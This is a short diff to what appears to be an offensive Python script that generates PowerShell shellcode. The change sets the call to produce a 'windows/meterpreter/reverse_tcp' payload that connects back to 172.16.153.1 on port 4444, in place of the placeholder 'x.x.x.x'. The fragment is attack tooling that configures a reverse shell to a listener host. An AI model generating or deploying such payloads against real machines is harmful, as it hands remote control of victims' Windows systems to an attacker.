@@ -19,4 +19,4 @@ def generate_powershell_shellcode(payload,ipaddr,port):
     print data
 
 
-generate_powershell_shellcode("windows/meterpreter/reverse_tcp", "x.x.x.x", "4444")
+generate_powershell_shellcode("windows/meterpreter/reverse_tcp", "172.16.153.1", "4444")
